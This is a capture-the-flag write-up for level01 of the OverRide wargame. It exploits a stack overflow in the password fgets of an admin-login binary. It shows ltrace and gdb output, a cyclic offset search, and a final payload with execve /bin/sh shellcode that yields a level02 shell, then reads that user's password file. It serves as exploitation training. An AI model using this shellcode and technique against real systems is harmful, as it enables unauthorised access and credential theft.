Here the vulnerable function is the second fgets which gets 100 characters in a 16 characters input buffer. We do not have a call to system in the program so we have to place a shellcode in executable memory first. The machine has no NX so we can place the shellcode everywhere but the easiest address to get is the address of the global variable a_user_name. We can easily get it using ltrace :

```bash
level01@OverRide:~$ ltrace ./level01
__libc_start_main(0x80484d0, 1, -10284, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)      = 39
printf("Enter Username: ")                       = 16
fgets(Enter Username: dat_wil
"dat_wil\n", 256, 0xf7fcfac0)              = 0x0804a040
puts("verifying username....\n"verifying username....

)                 = 24
puts("Enter Password: "Enter Password: 
)                         = 17
fgets(toto
"toto\n", 100, 0xf7fcfac0)                 = 0xffffd6ec
puts("nope, incorrect password...\n"nope, incorrect password...

)            = 29
+++ exited (status 1) +++
```

The address of a_user_name global variable is 0x0804a040. However, to pass the if statement we need the user name to start with dat_wil. Thus the first input will have to be "dat_wil" + the address of the shellcode and the second one will be the characters to overflow into EIP (since this is the vulnerable function) and write the address of the shellcode there which will be 0x0804a040 + 7 because dat_wil is 7 characters => 0x0804a047

To find the offset to the EIP pointer, we use a cyclic string generated with this website https://wiremask.eu/tools/buffer-overflow-pattern-generator/

With the cyclic we find that the offset by running the program in gdb.
```bash
level01@OverRide:~$ echo "dat_wil" > /tmp/in01
level01@OverRide:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" >> /tmp/in01
level01@OverRide:~$ gdb level01 -q
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) run < /tmp/in01
Starting program: /home/users/level01/level01 < /tmp/in01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

By looking at the string or just putting the segfault address in the cyclic generator tool, we get 80 characters offset

Final cooked payload :

```bash
(python -c 'print "dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"'; python -c 'print "N" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
```

And then...

```bash
level01@OverRide:~$ (python -c 'print "dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"'; python -c 'print "N" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```